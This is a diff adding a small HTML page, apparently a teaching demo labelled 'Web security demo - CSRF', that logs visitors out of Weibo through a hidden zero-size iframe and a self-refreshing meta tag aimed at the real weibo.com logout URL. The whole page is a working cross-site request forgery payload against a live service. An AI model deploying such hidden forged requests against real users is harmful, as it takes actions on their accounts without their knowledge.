@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Web 安全演示 </title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+    <meta http-equiv="refresh" content="8">
+</head>
+
+<body>
+    <h1>Web 安全演示 - CSRF</h1>
+    <p>访问这个页面，会自动退出微博</p>
+    <div><a href="http://weibo.com/logout.php?backurl=%2F">别点我</a></div>
+    <iframe src="http://weibo.com/logout.php?backurl=%2F"
+        frameborder="0" width="0" height="0" id="weibo"></iframe>
+
+</body>
+
+</html>
